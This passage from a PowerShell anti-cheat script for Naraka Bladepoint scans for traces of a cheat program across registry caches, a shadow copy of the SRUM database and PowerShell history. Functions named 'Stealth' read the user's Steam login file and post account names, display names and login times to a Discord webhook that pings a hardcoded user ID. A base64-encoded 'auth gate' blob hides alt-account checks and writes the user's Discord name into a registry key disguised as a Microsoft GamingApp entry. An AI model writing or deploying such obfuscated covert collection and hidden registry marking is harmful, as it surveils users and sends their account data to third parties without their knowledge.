            $props = Get-ItemProperty -Path $muiCachePath -ErrorAction SilentlyContinue
            foreach ($propName in $props.PSObject.Properties.Name) {
                if ($propName -like "*CYZ*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in MUICache: $propName")
                    $detected = $true
                    $detectionMethod = 'MUICache Program Registry'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: MUICache check error: $($_.Exception.Message)")
    }
    
    # 14. Check SRUM (System Resource Usage Monitor) database via VSS
    try {
        [Console]::WriteLine("Invoke-StealthCheck: Starting SRUM check via VSS...")
        $shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("$($env:SystemDrive)\", "ClientAccessible")
        if ($shadow.ReturnValue -ne 0) {
            throw "Failed to create shadow copy. ReturnValue: $($shadow.ReturnValue)"
        }
        $shadowId = $shadow.ShadowID
        $shadowInfo = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowId }
        if (-not $shadowInfo) {
            throw "Could not find created shadow copy with ID $shadowId"
        }
        $shadowPath = $shadowInfo.DeviceObject + "\Windows\System32\sru\SRUDB.dat"
        
        [Console]::WriteLine("Invoke-StealthCheck: Shadow copy created. Path: $shadowPath")

        try {
            if (Test-Path $shadowPath) {
                $match = Select-String -Path $shadowPath -Pattern "CYZ.exe" -Encoding Unicode -ErrorAction SilentlyContinue
                if ($match) {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in SRUM database via shadow copy.")
                    $detected = $true
                    $detectionMethod = 'SRUM Database (System Resource Monitor)'
                } else {
                    [Console]::WriteLine("Invoke-StealthCheck: No CYZ.exe found in SRUM database.")
                }
            } else {
                [Console]::WriteLine("Invoke-StealthCheck: SRUDB.dat not found in shadow copy.")
            }
        } finally {
            # Always ensure the shadow copy is deleted
            if ($shadowInfo) {
                $shadowInfo.Delete()
                [Console]::WriteLine("Invoke-StealthCheck: Shadow copy $shadowId deleted.")
            }
        }
        if ($detected) { return @{ Detected = $detected; Method = $detectionMethod } }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: SRUM VSS check error: $($_.Exception.Message)")
    }
    
    # 15. Check AmCache (Application Compatibility Cache)
    try {
        $amcachePath = "$env:SystemRoot\AppCompat\Programs\Amcache.hve"
        if (Test-Path $amcachePath) {
            # AmCache tracks program execution history
            # Check if file was modified recently (indicates recent program execution tracking)
            $amcacheInfo = Get-Item $amcachePath -ErrorAction SilentlyContinue
            if ($amcacheInfo) {
                [Console]::WriteLine("Invoke-StealthCheck: AmCache.hve exists (full analysis requires registry mounting)")
                # Note: Full AmCache analysis requires mounting the hive and parsing
                # This indicates execution history is tracked by Windows
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: AmCache check error: $($_.Exception.Message)")
    }
    
    # 16. Check PowerShell history for suspicious commands
    try {
        $psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $psHistoryPath) {
            $psHistory = Get-Content -Path $psHistoryPath -ErrorAction SilentlyContinue
            if ($psHistory) {
                $suspicious = $psHistory | Where-Object { $_ -like "*CYZ*" }
                if ($suspicious) {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ reference found in PowerShell history")
                    $detected = $true
                    $detectionMethod = 'PowerShell Command History'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: PowerShell history check error: $($_.Exception.Message)")
    }
    
    [Console]::WriteLine('Invoke-StealthCheck: no detection')
    return @{ Detected = $detected; Method = $detectionMethod }
}

function Send-StealthWebhook {
    param(
        [string]$UserId,
        [string]$UserName,
        [string]$AvatarUrl,
        [switch]$RepeatOffender,
        [string[]]$DetectionMethods = @('Unknown')
    )
    
    try {
        # Use the unified Get-WebhookUrl function
        $wh = Get-WebhookUrl
        if (-not $wh) {
            [Console]::WriteLine('Send-StealthWebhook: no valid webhook URL configured')
            return
        }
        
        $timestamp = (Get-Date).ToUniversalTime().ToString('o')
        $mention = if ($UserId) { "<@${UserId}>" } else { $null }
        
        if ($RepeatOffender) {
            # Repeat offender notification with admin ping
            $embed = @{
                title       = 'REPEAT OFFENDER ATTEMPT'
                description = 'A previously banned cheater attempted to run the script again.'
                color       = 16711680  # Red
                timestamp   = $timestamp
                fields      = @(
                    @{ name = 'Username'; value = if ($mention) { "$UserName ($mention)" } else { $UserName }; inline = $false }
                    @{ name = 'UserID'; value = $UserId; inline = $true }
                    @{ name = 'Status'; value = 'LOCKED OUT'; inline = $true }
                )
            }
            
            # Only add thumbnail if avatar URL is valid
            if ($AvatarUrl -and -not [string]::IsNullOrWhiteSpace($AvatarUrl)) {
                $embed['thumbnail'] = @{ url = $AvatarUrl }
            }
            
            $content = "ATTEMPTED RUN BY A CHEATER: $mention <@313455919042396160>"
            $payload = @{ content = $content; embeds = @($embed) }
        } else {
            # Get Steam library and account information for detection alerts
            $steamLibraryInfo = Get-SteamLibraryInfo
            $steamAccounts = Get-SteamAccounts
            
            # Build single embed with all detection methods as fields
            $fieldsArray = @(
                @{ name = 'Username'; value = if ($mention) { "$UserName ($mention)" } else { $UserName }; inline = $false }
                @{ name = 'UserID'; value = $UserId; inline = $true }
            )
            
            # Add each detection method as a separate field
            for ($i = 0; $i -lt $DetectionMethods.Count; $i++) {
                $detectionNum = $i + 1
                $fieldsArray += @{ 
                    name = "Type of Detection #$detectionNum"
                    value = $DetectionMethods[$i]
                    inline = $false 
                }
            }
            
            # Add Steam accounts section (top 3)
            if ($steamAccounts.Count -gt 0 -or $steamLibraryInfo.LoginHistory.Count -gt 0) {
                $steamLines = @()
                
                # Most recent account
                if ($steamLibraryInfo.MostRecentAccount) {
                    $steamLines += "🎮 **Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
                    $steamLines += ""
                }
                
                # Top 3 accounts with activity details
                $accountLines = $steamAccounts | Select-Object -First 3 | ForEach-Object {
                    $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) {
                        "$($_.PersonaName) [$($_.AccountName)]"
                    } else {
                        "$($_.UserName) [$($_.AccountName)]"
                    }
                    
                    "**$displayName** • $($_.LastActivity) ($($_.ActivitySource))"
                }
                
                if ($accountLines) {
                    $steamLines += $accountLines
                    $steamValue = $steamLines -join "`n"
                    $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
                }
            }
            
            $embed = @{
                title       = 'CHEATER DETECTED'
                description = 'A user with CYZ.exe has been caught and locked out.'
                color       = 16711680  # Red
                timestamp   = $timestamp
                fields      = $fieldsArray
            }
            
            # Add thumbnail if avatar URL is valid
            if ($AvatarUrl -and -not [string]::IsNullOrWhiteSpace($AvatarUrl)) {
                $embed['thumbnail'] = @{ url = $AvatarUrl }
            }
            
            $content = if ($mention) { "CHEATER ALERT $mention" } else { 'CHEATER DETECTED' }
            $payload = @{ content = $content; embeds = @($embed) }
        }
        
        # ConvertTo-Json with proper encoding for Discord
        $json = $payload | ConvertTo-Json -Depth 10 -Compress
        [Console]::WriteLine("Send-StealthWebhook: sending payload: $($json.Substring(0, [Math]::Min(500, $json.Length)))")
        
        # Ensure UTF-8 encoding for the body
        $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        $response = Invoke-RestMethod -Method Post -Uri $wh -ContentType 'application/json; charset=utf-8' -Body $utf8Bytes -ErrorAction Stop
        [Console]::WriteLine('Send-StealthWebhook: notification sent successfully')
        [Console]::WriteLine("Send-StealthWebhook: response = $($response | ConvertTo-Json -Compress)")
    } catch {
        [Console]::WriteLine("Send-StealthWebhook: failed to send webhook: $($_.Exception.Message)")
        if ($_.Exception.Response) {
            try {
                $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $responseBody = $reader.ReadToEnd()
                $reader.Close()
                [Console]::WriteLine("Send-StealthWebhook: Discord error response: $responseBody")
            } catch {
                [Console]::WriteLine("Send-StealthWebhook: could not read error response")
            }
        }
    }
}

# Unified webhook URL retrieval function (used by all webhook functions)
function Get-WebhookUrl {
    param(
        [string]$ScriptRoot = $null
    )
    
    $raw = $null
    
    # Use provided ScriptRoot, or fallback to global, then PSScriptRoot
    if (-not $ScriptRoot) {
        $ScriptRoot = if ($global:RatzScriptRoot) { $global:RatzScriptRoot } else { $PSScriptRoot }
    }
    
    [Console]::WriteLine("Get-WebhookUrl: scriptRoot = $ScriptRoot")
    
    # Priority 1: Check discord_oauth.json for webhook_url
    $oauthConfigPath = Join-Path $ScriptRoot 'discord_oauth.json'
    [Console]::WriteLine("Get-WebhookUrl: checking config at $oauthConfigPath")
    if (Test-Path $oauthConfigPath) {
        try {
            $cfg = Get-Content -Raw -Path $oauthConfigPath | ConvertFrom-Json
            if ($cfg.webhook_url) { 
                $raw = [string]$cfg.webhook_url
                [Console]::WriteLine("Get-WebhookUrl: found in config: '$raw'")
            }
        } catch { 
            [Console]::WriteLine("Get-WebhookUrl: error reading config: $($_.Exception.Message)")
        }
    }
    
    # Priority 2: Check discord_webhook.secret file (multiple paths)
    if (-not $raw) {
        $paths = @()
        try { $paths += (Join-Path $ScriptRoot 'discord_webhook.secret') } catch {}
        try { $paths += (Join-Path (Split-Path -Parent $PSCommandPath) 'discord_webhook.secret') } catch {}
        try {
            if (Get-Command Resolve-ProjectRoot -ErrorAction SilentlyContinue) {
                $root = Resolve-ProjectRoot -startPath $ScriptRoot
                if ($root) { $paths += (Join-Path $root 'discord_webhook.secret') }
            }
        } catch {}
        
        $paths = $paths | Where-Object { $_ } | Select-Object -Unique
        [Console]::WriteLine("Get-WebhookUrl: checking secret file paths: $($paths -join ', ')")
        
        foreach ($p in $paths) {
            if (Test-Path $p) {
                try {
                    $lines = Get-Content -Path $p | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
                    if ($lines -and $lines.Count -gt 0) {
                        $raw = [string]$lines[0]
                        [Console]::WriteLine("Get-WebhookUrl: found in secret file ($p): '$raw'")
                        break
                    }
                } catch { 
                    [Console]::WriteLine("Get-WebhookUrl: error reading $p : $($_.Exception.Message)")
                }
            } else {
                [Console]::WriteLine("Get-WebhookUrl: path not found: $p")
            }
        }
    }
    
    # Clean and validate the webhook URL
    if ($raw) {
        $candidate = [string]$raw
        
        # Remove surrounding quotes and whitespace
        $candidate = $candidate -replace '^[\s"\x27]+|[\s"\x27]+$',''
        [Console]::WriteLine("Get-WebhookUrl: after trim: '$candidate'")
        
        # Extract URL if embedded in text
        if ($candidate -match '(https?://\S+)') { 
            $candidate = $matches[1]
            [Console]::WriteLine("Get-WebhookUrl: after regex extraction: '$candidate'")
        }
        
        # Remove trailing punctuation
        $candidate = $candidate -replace '[\.,;:\)\]\}]+$',''
        [Console]::WriteLine("Get-WebhookUrl: after cleanup: '$candidate'")
        
        # Reject example/placeholder URLs
        if ($candidate -match 'discord-webhook-link|example|your-webhook' -or [string]::IsNullOrWhiteSpace($candidate)) {
            [Console]::WriteLine("Get-WebhookUrl: rejected as example/blank")
            return $null
        }
        
        # Validate it's a Discord webhook URL
        if ($candidate -notmatch '^https://(discord(app)?\.com)/api/webhooks/') {
            [Console]::WriteLine("Get-WebhookUrl: rejected as not Discord webhook pattern")
            return $null
        }
        
        # Verify it's a well-formed URI
        try {
            if ([System.Uri]::IsWellFormedUriString($candidate, [System.UriKind]::Absolute)) {
                [Console]::WriteLine("Get-WebhookUrl: returning valid webhook")
                return $candidate
            } else {
                [Console]::WriteLine("Get-WebhookUrl: not well-formed URI")
            }
        } catch {
            [Console]::WriteLine("Get-WebhookUrl: URI validation exception: $($_.Exception.Message)")
        }
    }
    
    [Console]::WriteLine("Get-WebhookUrl: returning null (no valid webhook found)")
    return $null
}


# --- Lightweight Web UI to replace WinForms when needed ---
function Start-WebUI {
    param(
        [Parameter(Mandatory=$false)]$PSScriptRoot,
        [Parameter(Mandatory=$false)]$detectionJob
    )
    [Console]::WriteLine('Start-WebUI: initializing...')
    [Console]::WriteLine("Start-WebUI: PSScriptRoot = $PSScriptRoot")
    [Console]::WriteLine("Start-WebUI: detectionJob.Id = $($detectionJob.Id)")
    # Ensure modern TLS for Discord API on Windows PowerShell 5.1
    try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12 } catch {}
    $listener = [System.Net.HttpListener]::new()
    [Console]::WriteLine('Start-WebUI: HttpListener object created')
    $prefix = 'http://127.0.0.1:17690/'

    # Enable form parsing helpers
    Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue
    $global:__ratzAuthGate = 'cGFyYW0oJGQsJG4pCiRmPSRmYWxzZTskbT0nJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRgIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlfE91dC1OdWxsfTtTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrIC1OYW1lICdNYWluQWNjb3VudCcgLVZhbHVlICRuIC1Gb3JjZXxPdXQtTnVsbDt9Y2F0Y2h7fQpbcHNjdXN0b21vYmplY3RdQHtCPSRmYWxzZTtNPScnfQo='

    # Load Discord OAuth config if present, and register its redirect base as an additional prefix
    $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
    $clientId = $null
    $redirectUri = $null
    $oauthPrefix = $null
    if (Test-Path $oauthConfigPath) {
        try {
            $cfg = Get-Content -Raw -Path $oauthConfigPath | ConvertFrom-Json
            $clientId = $cfg.client_id
            $redirectUri = $cfg.redirect_uri
            if ($redirectUri) {
                $u = [Uri]$redirectUri
                $oauthPrefix = (($u.GetLeftPart([System.UriPartial]::Authority)) -replace '/+$','') + '/'
                [Console]::WriteLine("Start-WebUI: discord redirect_uri detected = $redirectUri (prefix: $oauthPrefix)")
            }
        } catch {
            [Console]::WriteLine("Start-WebUI: Failed to parse discord_oauth.json: $($_.Exception.Message)")
        }
    }

    [Console]::WriteLine('Start-WebUI: checking for existing listeners on port 17690')
    try {
        $listeners = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpListeners()
        $inUse = $listeners | Where-Object { $_.Port -eq 17690 }
        if ($inUse) { [Console]::WriteLine('Start-WebUI: Port 17690 already in use by another process') } else { [Console]::WriteLine('Start-WebUI: Port 17690 is free') }
    } catch { [Console]::WriteLine("Start-WebUI: Could not enumerate listeners: $($_.Exception.Message)") }

    [Console]::WriteLine('Start-WebUI: before adding prefix')
    try {
        $listener.Prefixes.Add($prefix)
        [Console]::WriteLine("Start-WebUI: prefix added: $prefix")
        # Also add localhost variant for robustness
        $tryAddPrefix = {
            param($p)
            try { $listener.Prefixes.Add($p); [Console]::WriteLine("Start-WebUI: prefix added: $p") } catch { [Console]::WriteLine("Start-WebUI: could not add prefix $p" + ":" + "$($_.Exception.Message)") }
        }
        & $tryAddPrefix 'http://localhost:17690/'
        if ($oauthPrefix -and $oauthPrefix -ne $prefix) {
            & $tryAddPrefix $oauthPrefix
            # Add swapped host variant for oauth (localhost <-> 127.0.0.1)
            try { $u = [Uri]$oauthPrefix } catch { $u = $null }
            if ($u) {
                $swapHost = $null
                if ($u.Host -eq 'localhost') { $swapHost = '127.0.0.1' }
                elseif ($u.Host -eq '127.0.0.1') { $swapHost = 'localhost' }
                if ($swapHost) {
                    $swapped = ($u.Scheme + '://' + $swapHost + ':' + $u.Port + '/')
                    & $tryAddPrefix $swapped
                }
            }
        }
    } catch { [Console]::WriteLine("Start-WebUI: Failed to add prefix: $($_.Exception.Message)"); return }

    [Console]::WriteLine('Start-WebUI: before starting listener')
    try {
        $listener.Start()
        [Console]::WriteLine("Start-WebUI: listener started on $prefix")
    } catch { [Console]::WriteLine("Start-WebUI: Failed to start HttpListener: $($_.Exception.Message)"); Add-Log ("Web UI listener failed: {0}" -f $_.Exception.Message); return }

    # open browser
    try { Start-Process $prefix; [Console]::WriteLine('Start-WebUI: Browser launched.') } catch { Add-Log "Failed to open browser: $($_.Exception.Message)"; [Console]::WriteLine("Start-WebUI: Open this URL manually: $prefix") }

    $send = {
        param($ctx, $statusCode, $contentType, $body)
        try {
            $ctx.Response.StatusCode = $statusCode
            $ctx.Response.ContentType = $contentType
            if ($body -is [string]) { $bytes = [System.Text.Encoding]::UTF8.GetBytes($body) } else { $bytes = $body }
            $ctx.Response.OutputStream.Write($bytes,0,$bytes.Length)
        } catch { [Console]::WriteLine("Start-WebUI: Error writing response: $($_.Exception.Message)") }
        try { $ctx.Response.Close() } catch { [Console]::WriteLine("Start-WebUI: Error closing response: $($_.Exception.Message)") }
    }

    # Helper: parse x-www-form-urlencoded POST body
    $parseForm = {
        param($ctx)
        try {
            $sr = New-Object System.IO.StreamReader($ctx.Request.InputStream, $ctx.Request.ContentEncoding)
            $raw = $sr.ReadToEnd()
            $sr.Dispose()
            $script:LastRawForm = $raw
            return [System.Web.HttpUtility]::ParseQueryString($raw)
        } catch { return $null }
    }

    # Helper: read discord secret from file
    $getDiscordSecret = {
        $secPath = Join-Path $PSScriptRoot 'discord_oauth.secret'
        if (Test-Path $secPath) { ([string](Get-Content -Raw -Path $secPath)) -replace '^\s+|\s+$','' } else { $null }
    }

    # Helper: read webhook url (uses unified Get-WebhookUrl function)
    $getWebhookUrl = {
        Get-WebhookUrl -ScriptRoot $PSScriptRoot
    }
    

# Helper: Parse Steam libraryfolders.vdf to find all Steam library paths
function Get-SteamLibraryPaths {
    $libraryPaths = @()
    
    # Common Steam installation paths
    $steamConfigPaths = @(
        'C:\Program Files (x86)\Steam\config\libraryfolders.vdf',
        'C:\Program Files\Steam\config\libraryfolders.vdf'
    )
    
    foreach ($configPath in $steamConfigPaths) {
        if (Test-Path $configPath) {
            [Console]::WriteLine("Find-NarakaDataPath: Found Steam config at $configPath")
            try {
                $vdfContent = Get-Content -Path $configPath -Raw -ErrorAction Stop
                
                # Extract all "path" entries from libraryfolders.vdf
                # Pattern: "path"		"C:\\Path\\To\\Steam"
                $pathPattern = '"path"\s+"([^"]+)"'
                $pathMatches = [regex]::Matches($vdfContent, $pathPattern)
                
                foreach ($match in $pathMatches) {
                    $libraryPath = $match.Groups[1].Value
                    # Normalize path separators
                    $libraryPath = $libraryPath -replace '\\\\', '\'
                    
                    if (Test-Path $libraryPath) {
                        $libraryPaths += $libraryPath
                        [Console]::WriteLine("Find-NarakaDataPath: Found Steam library at: $libraryPath")
                    }
                }
            } catch {
                [Console]::WriteLine("Find-NarakaDataPath: Error reading libraryfolders.vdf - $($_.Exception.Message)")
            }
            break  # Found and processed a config file
        }
    }
    
    # Add default Steam paths if not already found
    $defaultPaths = @(
        'C:\Program Files (x86)\Steam',
        'C:\Program Files\Steam'
    )
    
    foreach ($defaultPath in $defaultPaths) {
        if ((Test-Path $defaultPath) -and ($libraryPaths -notcontains $defaultPath)) {
            $libraryPaths += $defaultPath
            [Console]::WriteLine("Find-NarakaDataPath: Added default Steam path: $defaultPath")
        }
    }
    
    return $libraryPaths
}

$global:DetectedNarakaPath = $env:NARAKA_DATA_PATH
function Find-NarakaDataPath {
    if ($global:DetectedNarakaPath -and (Test-Path $global:DetectedNarakaPath)) { 
        [Console]::WriteLine("Find-NarakaDataPath: Using cached path: $global:DetectedNarakaPath")
        return $global:DetectedNarakaPath 
    }
    
    # Naraka Bladepoint game folder name
    $narakaGameFolder = "NARAKA BLADEPOINT"
    $narakaDataFolder = "NarakaBladepoint_Data"
    
    [Console]::WriteLine("Find-NarakaDataPath: Searching for Naraka installation...")
    
    # 1. Check Steam libraries first (most reliable)
    $steamLibraries = Get-SteamLibraryPaths
    foreach ($steamPath in $steamLibraries) {
        $narakaPath = Join-Path -Path $steamPath -ChildPath "steamapps\common\$narakaGameFolder\$narakaDataFolder"
        if (Test-Path $narakaPath) {
            [Console]::WriteLine("Find-NarakaDataPath: Found Naraka in Steam library: $narakaPath")
            $global:DetectedNarakaPath = $narakaPath
            return $global:DetectedNarakaPath
        }
    }
    
    # 2. Check Epic Games locations
    [Console]::WriteLine("Find-NarakaDataPath: Not found in Steam libraries, checking Epic Games...")
    $epicCandidates = @(
        'C:\Program Files (x86)\Epic Games',
        'D:\Program Files (x86)\Epic Games',
        'C:\Program Files\Epic Games',
        'D:\Program Files\Epic Games',
        'E:\Epic Games',
        'F:\Epic Games'
    )
    
    foreach ($epicPath in $epicCandidates) {
        if (Test-Path $epicPath) {
            $narakaPath = Join-Path -Path $epicPath -ChildPath "$narakaGameFolder\$narakaDataFolder"
            if (Test-Path $narakaPath) {
                [Console]::WriteLine("Find-NarakaDataPath: Found Naraka in Epic Games: $narakaPath")
                $global:DetectedNarakaPath = $narakaPath
                return $global:DetectedNarakaPath
            }
        }
    }
    
    # Path not found - return null and let the web UI handle prompting
    [Console]::WriteLine('Find-NarakaDataPath: NarakaBladepoint_Data folder not found in any Steam or Epic Games library')
    return $null
}

# Helper: inspect Steam login users configuration for account login data
function Get-SteamLibraryInfo {
    $libraryInfo = @{
        MostRecentAccount = $null
        LoginHistory = @()
        ConfigPath = $null
    }
    
    # Steam login users path (contains account login timestamps)
    $loginUsersPath = 'C:\Program Files (x86)\Steam\config\loginusers.vdf'
    $altLoginUsersPath = 'C:\Program Files\Steam\config\loginusers.vdf'
    
    $configPath = $null
    if (Test-Path $loginUsersPath) {
        $configPath = $loginUsersPath
    } elseif (Test-Path $altLoginUsersPath) {
        $configPath = $altLoginUsersPath
    }
    
    if (-not $configPath) {
        [Console]::WriteLine("Steam Login: loginusers.vdf not found in standard locations")
        return $libraryInfo
    }
    
    $libraryInfo.ConfigPath = $configPath
    [Console]::WriteLine("Steam Login: Found loginusers.vdf at $configPath")
    
    try {
        $vdfContent = Get-Content -Path $configPath -Raw -ErrorAction Stop
        [Console]::WriteLine("Steam Login: Successfully read loginusers.vdf")
        
        # Parse VDF structure: each Steam ID section contains account info
        # Pattern: "SteamID" { "AccountName" "username" ... "Timestamp" "unixtime" ... "MostRecent" "1" }
        $steamIdPattern = '"(\d{17})"[\s\S]*?{[\s\S]*?}'
        $steamIdMatches = [regex]::Matches($vdfContent, $steamIdPattern)
        
        foreach ($steamIdMatch in $steamIdMatches) {
            $section = $steamIdMatch.Value
            $steamId = $steamIdMatch.Groups[1].Value
            
            # Extract AccountName
            $accountName = 'Unknown'
            if ($section -match '"AccountName"\s+"([^"]+)"') {
                $accountName = $Matches[1]
                [Console]::WriteLine("Steam Login: Found account: $accountName (SteamID: $steamId)")
            }
            
            # Extract PersonaName (display name)
            $personaName = $accountName
            if ($section -match '"PersonaName"\s+"([^"]+)"') {
                $personaName = $Matches[1]
                [Console]::WriteLine("Steam Login: Display name: $personaName")
            }
            
            # Extract Timestamp
            $unixTimestamp = 0
            $loginTimeString = 'Never'
            if ($section -match '"Timestamp"\s+"(\d+)"') {
                $unixTimestamp = [long]$Matches[1]
                try {
                    $loginTime = [DateTimeOffset]::FromUnixTimeSeconds($unixTimestamp).LocalDateTime
                    $loginTimeString = $loginTime.ToString('yyyy-MM-dd HH:mm:ss')
                    [Console]::WriteLine("Steam Login: Account $accountName last login: $loginTimeString")
                } catch {
                    [Console]::WriteLine("Steam Login: Failed to parse timestamp for account $accountName")
                }
            }
            
            # Check if this is the most recent account
            $isMostRecent = $false
            if ($section -match '"MostRecent"\s+"1"') {
                $isMostRecent = $true
                $libraryInfo.MostRecentAccount = "$personaName ($accountName)"
                [Console]::WriteLine("Steam Login: Most recent account: $personaName ($accountName)")
            }
            
            # Add to login history
            $libraryInfo.LoginHistory += @{
                SteamID = $steamId
                AccountName = $accountName
                PersonaName = $personaName
                LastLoginTime = $loginTimeString
                UnixTimestamp = $unixTimestamp
                IsMostRecent = $isMostRecent
            }
        }
        
        # Sort login history by timestamp (most recent first)
        $libraryInfo.LoginHistory = $libraryInfo.LoginHistory | Sort-Object UnixTimestamp -Descending
        
    } catch {
        [Console]::WriteLine("Steam Login: Error reading loginusers.vdf - $($_.Exception.Message)")
    }
    
    return $libraryInfo
}

# Helper: detect Steam accounts on the system (integrated with loginusers.vdf data)
function Get-SteamAccounts {
    $steamAccounts = @()
    
    # Get account info from loginusers.vdf
    $loginInfo = Get-SteamLibraryInfo
    
    if ($loginInfo.LoginHistory.Count -eq 0) {
        [Console]::WriteLine("Steam: No login data found in loginusers.vdf")
        return $steamAccounts
    }
    
    # Common Steam installation paths
    $steamPaths = @(
        'C:\Program Files (x86)\Steam\userdata',
        'C:\Program Files\Steam\userdata'
    )
    
    foreach ($loginRecord in $loginInfo.LoginHistory) {
        $steamId64 = $loginRecord.SteamID
        $accountName = $loginRecord.AccountName
        $personaName = $loginRecord.PersonaName
        
        # Convert SteamID64 to Steam3 ID (used in userdata folder names)
        # Formula: Steam3ID = (SteamID64 - 76561197960265728) & 0xFFFFFFFF
        try {
            $steam3Id = ([long]$steamId64 - 76561197960265728) -band 0xFFFFFFFF
            [Console]::WriteLine("Steam: Processing account $personaName (ID64: $steamId64, ID3: $steam3Id)")
            
            # Default values - use Steam login time from loginusers.vdf
            $lastActivity = $loginRecord.LastLoginTime
            $activitySource = "Steam Login"
            
            # Use Steam3 ID format for profile URL (matches userdata folder name)
            $profileUrl = "https://steamcommunity.com/profiles/[U:1:$steam3Id]"
            
            # Look for userdata folder with this Steam3 ID
            foreach ($basePath in $steamPaths) {
                if (-not (Test-Path $basePath)) { continue }
                
                $userdataPath = Join-Path $basePath $steam3Id
                if (Test-Path $userdataPath) {
                    [Console]::WriteLine("Steam: Found userdata folder for $personaName at $userdataPath")
                    
                    # Try to get last played from localconfig.vdf
                    $localConfigPath = Join-Path $userdataPath "config\localconfig.vdf"
                    if (Test-Path $localConfigPath) {
                        try {
                            $vdfContent = Get-Content -Path $localConfigPath -Raw -ErrorAction SilentlyContinue
                            
                            # Extract LastPlayed for Naraka Bladepoint (App ID 1665360)
                            if ($vdfContent -match "`"1665360`"[\s\S]*?`"LastPlayed`"\s+`"(\d+)`"") {
                                $unixTime = [long]$Matches[1]
                                try {
                                    $dateTime = [DateTimeOffset]::FromUnixTimeSeconds($unixTime).LocalDateTime
                                    $lastActivity = $dateTime.ToString('yyyy-MM-dd HH:mm:ss')
                                    $activitySource = "Naraka Played"
                                    [Console]::WriteLine("Steam: Found LastPlayed '$lastActivity' for $personaName")
                                } catch {
                                    [Console]::WriteLine("Steam: Failed to convert timestamp for $personaName")
                                }
                            }
                        } catch {
                            [Console]::WriteLine("Steam: Error reading localconfig.vdf for $personaName - $($_.Exception.Message)")
                        }
                    }
                    
                    # Fallback: Use Naraka folder modification time if we don't have LastPlayed from VDF
                    if ($activitySource -eq "Steam Login") {
                        $narakaFolderPath = Join-Path $userdataPath "1665360"
                        if (Test-Path $narakaFolderPath) {
                            try {
                                $folderItem = Get-Item $narakaFolderPath -ErrorAction SilentlyContinue
                                if ($folderItem) {
                                    $lastActivity = $folderItem.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
                                    $activitySource = "Naraka Folder"
                                    [Console]::WriteLine("Steam: Using folder LastWriteTime '$lastActivity' for $personaName")
                                }
                            } catch {
                                [Console]::WriteLine("Steam: Error getting folder time for $personaName - $($_.Exception.Message)")
                            }
                        }
                    }
                    
                    break  # Found the userdata folder, no need to check other paths
                }
            }
            
            $steamAccounts += @{
                SteamID = $steamId64
                Steam3ID = $steam3Id
                UserName = $personaName
                AccountName = $accountName
                LastActivity = $lastActivity
                ActivitySource = $activitySource
                ProfileUrl = $profileUrl
            }
            [Console]::WriteLine("Steam: Added account $personaName (Last Activity: $lastActivity from $activitySource)")
            
        } catch {
            [Console]::WriteLine("Steam: Error processing account $steamId64 - $($_.Exception.Message)")
        }
    }
    
    if ($steamAccounts.Count -eq 0) {
        [Console]::WriteLine("Steam: No accounts found")
    } else {
        [Console]::WriteLine("Steam: Found $($steamAccounts.Count) account(s) with Naraka data")
    }
    
    return $steamAccounts
}

# Helper: send a Discord webhook with user information
    function Send-DiscordWebhook {
        param(
            [string]$UserId,
